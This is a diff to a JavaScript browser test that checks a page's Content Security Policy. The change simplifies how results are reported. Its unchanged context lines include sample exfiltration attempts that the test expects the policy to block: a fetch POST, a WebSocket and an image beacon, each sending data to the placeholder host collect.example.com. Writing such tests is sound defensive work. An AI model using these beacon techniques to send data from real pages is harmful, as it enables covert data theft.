@@ -11,7 +11,7 @@ const path = require('path');
 const crypto = require('crypto');
 const { launch, serve, reporter } = require('./browser');
 const root = path.join(__dirname, '..');
-const report = reporter(), { results, check } = report;
+const report = reporter(), { check } = report;
 
 const html = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
 const PEERJS = fs.readFileSync(path.join(root, 'net.js'), 'utf8').match(/const PEERJS = '([^']+)'/)[1];
@@ -90,13 +90,9 @@ const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation'
     await refused('sending to another site', `fetch('https://collect.example.com/?d=1', { method: 'POST', body: 'x' }).then(() => true, () => false)`, 'connect-src');
     await refused('a socket to another site', `(() => { try { new WebSocket('wss://collect.example.com/'); } catch {} return false; })()`, 'connect-src');
     await refused('an image from another site (a way to send)', `new Promise(r => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = 'https://collect.example.com/p.gif?d=1'; })`, 'img-src');
-
-    console.log(results.join('\n'));
-    if (b.errors.length) { console.log('page errors:', b.errors); report.failed++; }
   } finally {
     await b.close();
     site.close();
   }
-  if (report.failed) { console.error(`\n${report.failed} failed`); process.exit(1); }
-  console.log(`\nall passed (${results.length} checks)`);
+  report.end(b);
 })().catch(e => { console.error(e); process.exit(1); });
